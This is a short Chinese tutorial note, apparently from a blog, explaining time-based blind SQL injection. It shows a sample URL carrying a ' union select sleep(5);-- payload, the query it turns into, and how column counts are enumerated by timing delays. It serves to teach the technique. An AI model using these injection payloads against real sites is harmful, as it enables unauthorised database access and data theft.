# 基于时间的Blind SQLi
一个 基于时间的blind SQLi与基于布尔值的blind SQLi非常相似，因为发送了相同的请求，但是这次的查询是错误还是正确的，我们没有参考指标。相反，我们的正确查询的指示器基于查询所花费的时间完成。

### 例如
```
http://abc/edf/?referrer=jhinjax
```
那么我们可以这样
```
http://abc/edf?referrer=jhinjax123 ' unicon select sleep(5);--
等于
select * from edf where referrer = 'jhinjax123' unicon select sleep(5);-- limit 1;
等于
select * from edf where referrer = 'jhinjax123' union select sleep(5);
```

这样只有暂停了5秒后返回的结果才是查询成功的结果，否则不是
接着我们就可以一步一步枚举了
先枚举列数
```
referrer ='jhinjax123' union select sleep(5),2;--
```
依次类推枚举
枚举过程可查看[基于布尔值的Blind SQLi - 野荷 - 博客园 (cnblogs.com)](https://www.cnblogs.com/jhinjax/p/17258440.html)
只不过多了个sleep(5)罢了，其他的都一样
